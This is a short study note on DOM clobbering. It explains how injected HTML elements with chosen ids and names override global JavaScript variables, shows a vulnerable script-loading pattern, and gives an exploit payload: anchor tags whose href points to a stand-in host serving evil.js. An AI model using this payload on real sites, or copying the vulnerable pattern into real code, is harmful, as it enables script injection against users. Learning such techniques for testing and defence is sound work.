# DOM Clobbering

_DOM clobbering_ is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page

```
- window object & scope
- <button id="btn">click me</button>
- event listener
- <a id=someObject href="a:alert(1);">
- https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString
```

### multi level attribute

```
- Multi-Level
    - form[name], form[id]
    - HTML Collection -> chrome
    - https://dclobber.herokuapp.com
    - New DOM Clobbering techniques
        - https://portswigger.net/research/dom-clobbering-strikes-back
```

### common pattern

```
var someObject = window.someObject || {};

<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```

### exploit

```
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```

### Tips

this attack only work in  chrome

if programmer use fixed value for window.someObject this bug not work

we can directly call every object with id tag name !
